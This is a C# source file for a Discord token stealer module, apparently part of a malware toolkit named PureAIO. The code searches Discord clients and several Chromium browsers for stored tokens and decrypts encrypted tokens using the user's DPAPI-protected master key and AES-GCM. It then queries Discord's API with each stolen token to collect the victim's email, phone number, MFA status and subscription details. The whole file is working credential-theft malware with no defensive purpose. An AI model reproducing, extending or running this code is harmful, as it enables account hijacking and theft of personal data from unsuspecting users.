// DiscordTokenStealer — extracts Discord tokens from:
//   • Discord app (stable / ptb / canary / development) LevelDB + AES-GCM blobs
//   • Chromium-based browsers (same LevelDB path)
// Each unique token is enriched via discord.com/api/v10/users/@me.

using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using PureAIO.Client.Util;

namespace PureAIO.Client.Stealers
{
    public static class DiscordTokenStealer
    {
        // ── Entry point ───────────────────────────────────────────────────────
        public static List<TokenEntry> Collect()
        {
            var results = new List<TokenEntry>();
            foreach (var (name, lsPath, appPath) in Sources())
            {
                if (!Directory.Exists(lsPath)) continue;
                var key = appPath != null ? GetMasterKey(appPath) : null;
                Try(() => ScanLevelDb(lsPath, name, key, results));
            }

            // De-duplicate by value, then enrich
            var seen   = new HashSet<string>(StringComparer.Ordinal);
            var unique = new List<TokenEntry>();
            foreach (var t in results)
            {
                if (seen.Add(t.Value))
                {
                    EnrichDiscord(t);
                    unique.Add(t);
                }
            }
            return unique;
        }

        // ── Source list ───────────────────────────────────────────────────────
        private static IEnumerable<(string name, string leveldb, string appData)> Sources()
        {
            var roaming = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            var local   = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

            // Discord app variants
            foreach (var (vname, dir) in new[]
            {
                ("Discord",     Path.Combine(roaming, "discord")),
                ("DiscordPTB",  Path.Combine(roaming, "discordptb")),
                ("DiscordCanary",Path.Combine(roaming, "discordcanary")),
                ("DiscordDev",  Path.Combine(roaming, "discorddevelopment")),
            })
            {
                yield return (vname,
                    Path.Combine(dir, "Local Storage", "leveldb"),
                    dir);
            }

            // Chromium browsers (same Local State + LevelDB layout)
            foreach (var (vname, ud) in new[]
            {
                ("Chrome",   Path.Combine(local,   @"Google\Chrome\User Data")),
                ("Edge",     Path.Combine(local,   @"Microsoft\Edge\User Data")),
                ("Brave",    Path.Combine(local,   @"BraveSoftware\Brave-Browser\User Data")),
                ("Opera",    Path.Combine(roaming, @"Opera Software\Opera Stable")),
                ("OperaGX",  Path.Combine(roaming, @"Opera Software\Opera GX Stable")),
                ("Vivaldi",  Path.Combine(local,   @"Vivaldi\User Data")),
            })
            {
                foreach (var profile in ChromiumProfiles(ud))
                {
                    var ldb = Path.Combine(profile, "Local Storage", "leveldb");
                    yield return (vname + ":" + Path.GetFileName(profile), ldb, ud);
                }
            }
        }

        private static IEnumerable<string> ChromiumProfiles(string ud)
        {
            yield return Path.Combine(ud, "Default");
            var i = 1;
            while (Directory.Exists(Path.Combine(ud, "Profile " + i)))
                yield return Path.Combine(ud, "Profile " + i++);
        }

        // ── LevelDB scan ──────────────────────────────────────────────────────
        private static readonly Regex _tokenRx = new Regex(
            @"(?:mfa\.[A-Za-z0-9_\-]{84}|[A-Za-z0-9_\-]{24}\.[A-Za-z0-9_\-]{6}\.[A-Za-z0-9_\-]{27,})",
            RegexOptions.Compiled);

        private static void ScanLevelDb(string ldbPath, string sourceName,
                                        byte[] masterKey, List<TokenEntry> results)
        {
            foreach (var file in Directory.GetFiles(ldbPath, "*.ldb"))
                Try(() => ScanFile(file, sourceName, masterKey, results));
            foreach (var file in Directory.GetFiles(ldbPath, "*.log"))
                Try(() => ScanFile(file, sourceName, masterKey, results));
        }

        private static readonly byte[] _v10 = Encoding.ASCII.GetBytes("v10");
        private static readonly byte[] _v11 = Encoding.ASCII.GetBytes("v11");

        private static void ScanFile(string path, string sourceName,
                                     byte[] key, List<TokenEntry> results)
        {
            var raw = File.ReadAllBytes(path);

            // Plaintext token regex pass
            var text = Encoding.UTF8.GetString(raw);
            foreach (Match m in _tokenRx.Matches(text))
                results.Add(new TokenEntry { Source = sourceName, Value = m.Value });

            // Encrypted blob pass (v10/v11 prefix)
            if (key == null) return;
            for (int i = 0; i < raw.Length - 15; i++)
            {
                if (!Match(raw, i, _v10) && !Match(raw, i, _v11)) continue;
                // 12-byte nonce starts right after the 3-byte version prefix
                var blobStart = i + 3;
                var blobLen   = FindBlobEnd(raw, blobStart, 512);
                if (blobLen < 29) continue;
                var blob  = new byte[blobLen];
                Buffer.BlockCopy(raw, blobStart, blob, 0, blobLen);
                var plain = TryDecryptAesGcm(key, blob);
                if (plain == null) continue;
                foreach (Match m in _tokenRx.Matches(plain))
                    results.Add(new TokenEntry { Source = sourceName + ":enc", Value = m.Value });
            }
        }

        // ── Chromium master key ───────────────────────────────────────────────
        private static byte[] GetMasterKey(string appRoot)
        {
            // For Discord app: Local State sits in the app root dir
            // For browsers: in User Data root
            var ls = Path.Combine(appRoot, "Local State");
            if (!File.Exists(ls)) return null;
            var json = File.ReadAllText(ls, Encoding.UTF8);
            var m    = Regex.Match(json, @"""encrypted_key""\s*:\s*""([^""]+)""");
            if (!m.Success) return null;
            var blob = Convert.FromBase64String(m.Groups[1].Value);
            if (blob.Length < 5) return null;
            var dpapi = new byte[blob.Length - 5];
            Buffer.BlockCopy(blob, 5, dpapi, 0, dpapi.Length);
            try
            {
                return ProtectedData.Unprotect(dpapi, null, DataProtectionScope.CurrentUser);
            }
            catch { return null; }
        }

        // ── AES-GCM decrypt (BCrypt P/Invoke — same as cookie stealer) ────────
        [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
        static extern int BCryptOpenAlgorithmProvider(out IntPtr h, string alg, string impl, uint flags);
        [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
        static extern int BCryptSetProperty(IntPtr h, string prop, byte[] val, int len, uint flags);
        [DllImport("bcrypt.dll")]
        static extern int BCryptGenerateSymmetricKey(IntPtr h, out IntPtr hKey, byte[] obj, int objLen, byte[] secret, int secLen, uint flags);
        [DllImport("bcrypt.dll")]
        static extern int BCryptDecrypt(IntPtr hKey, byte[] ct, int ctLen, ref AUTH_INFO authInfo,
                                        byte[] iv, int ivLen, byte[] pt, int ptLen, out int result, uint flags);
        [DllImport("bcrypt.dll")]
        static extern int BCryptDestroyKey(IntPtr hKey);
        [DllImport("bcrypt.dll")]
        static extern int BCryptCloseAlgorithmProvider(IntPtr h, uint flags);

        [StructLayout(LayoutKind.Sequential)]
        struct AUTH_INFO
        {
            public int    cbSize;
            public int    dwInfoVersion;
            public IntPtr pbNonce;
            public int    cbNonce;
            public IntPtr pbAuthData;
            public int    cbAuthData;
            public IntPtr pbTag;
            public int    cbTag;
            public IntPtr pbMacContext;
            public int    cbMacContext;
            public int    cbAAD;
            public long   cbData;
            public uint   dwFlags;
        }

        private static string TryDecryptAesGcm(byte[] key, byte[] blob)
        {
            if (blob.Length < 29) return null;
            const int nonceLen = 12;
            const int tagLen   = 16;
            var ctLen  = blob.Length - nonceLen - tagLen;
            if (ctLen <= 0) return null;
            var nonce = new byte[nonceLen];
            var ct    = new byte[ctLen];
            var tag   = new byte[tagLen];
            Buffer.BlockCopy(blob, 0,              nonce, 0, nonceLen);
            Buffer.BlockCopy(blob, nonceLen,       ct,    0, ctLen);
            Buffer.BlockCopy(blob, nonceLen + ctLen, tag, 0, tagLen);

            BCryptOpenAlgorithmProvider(out var hAlg, "AES", null, 0);
            var chainMode = Encoding.Unicode.GetBytes("ChainingModeGCM\0");
            BCryptSetProperty(hAlg, "ChainingMode", chainMode, chainMode.Length, 0);
            BCryptGenerateSymmetricKey(hAlg, out var hKey, null, 0, key, key.Length, 0);

            var tagH   = GCHandle.Alloc(tag,   GCHandleType.Pinned);
            var nonceH = GCHandle.Alloc(nonce, GCHandleType.Pinned);
            try
            {
                var ai = new AUTH_INFO
                {
                    cbSize        = Marshal.SizeOf(typeof(AUTH_INFO)),
                    dwInfoVersion = 1,
                    pbNonce       = nonceH.AddrOfPinnedObject(),
                    cbNonce       = nonceLen,
                    pbTag         = tagH.AddrOfPinnedObject(),
                    cbTag         = tagLen,
                };
                var pt = new byte[ctLen];
                BCryptDecrypt(hKey, ct, ctLen, ref ai, null, 0, pt, ctLen, out _, 0);
                BCryptDestroyKey(hKey);
                BCryptCloseAlgorithmProvider(hAlg, 0);
                return Encoding.UTF8.GetString(pt).TrimEnd('\0');
            }
            catch { return null; }
            finally { tagH.Free(); nonceH.Free(); }
        }

        // ── Discord API enrichment ────────────────────────────────────────────
        private static void EnrichDiscord(TokenEntry t)
        {
            try
            {
                var json = DiscordGet("https://discord.com/api/v10/users/@me", t.Value);
                if (json == null) { t.EnrichError = "api_failed"; return; }

                t.UserId        = SimpleJson.GetString(json, "id");
                t.Username      = SimpleJson.GetString(json, "username");
                t.GlobalName    = SimpleJson.GetString(json, "global_name");
                t.Discriminator = SimpleJson.GetString(json, "discriminator");
                t.Email         = SimpleJson.GetString(json, "email");
                t.EmailVerified = SimpleJson.GetBool(json,   "verified");
                t.Phone         = SimpleJson.GetString(json, "phone");
                t.MfaEnabled    = SimpleJson.GetBool(json,   "mfa_enabled");
                t.NitroType     = (int)SimpleJson.GetLong(json, "premium_type");
                t.Flags         = (int)SimpleJson.GetLong(json, "flags");
                t.Locale        = SimpleJson.GetString(json, "locale");

                // Derive creation timestamp from Discord snowflake
                if (long.TryParse(t.UserId, out var snowflake) && snowflake > 0)
                    t.AccountCreated = (snowflake >> 22) + 1_420_070_400_000L;

                // Nitro subscription details (may 403 on some accounts)
                var subJson = DiscordGet(
                    "https://discord.com/api/v10/users/@me/billing/subscriptions", t.Value);
                if (subJson != null && subJson.Contains("current_period_end"))
                {
                    var m = Regex.Match(subJson, @"""current_period_end""\s*:\s*""([^""]+)""");
                    if (m.Success) t.NitroExpiry = m.Groups[1].Value;
                }
            }
            catch (Exception ex)
            {
                t.EnrichError = ex.Message.Length > 60
                    ? ex.Message.Substring(0, 60)
                    : ex.Message;
            }
        }

        private static string DiscordGet(string url, string token)
        {
            try
            {
                var req = (HttpWebRequest)WebRequest.Create(url);
                req.Method  = "GET";
                req.Timeout = 8_000;
                req.Headers["Authorization"] = token;
                req.Headers["Content-Type"]  = "application/json";
                req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
                using var resp = (HttpWebResponse)req.GetResponse();
                using var sr   = new StreamReader(resp.GetResponseStream(), Encoding.UTF8);
                return sr.ReadToEnd();
            }
            catch { return null; }
        }

        // ── Utilities ─────────────────────────────────────────────────────────
        private static bool Match(byte[] buf, int pos, byte[] pat)
        {
            if (pos + pat.Length > buf.Length) return false;
            for (int k = 0; k < pat.Length; k++)
                if (buf[pos + k] != pat[k]) return false;
            return true;
        }

        private static int FindBlobEnd(byte[] buf, int start, int maxLen)
        {
            int end = Math.Min(start + maxLen, buf.Length);
            int len = end - start;
            while (len > 29 && buf[start + len - 1] == 0) len--;
            return len;
        }

        private static void Try(Action a) { try { a(); } catch { } }
    }
}
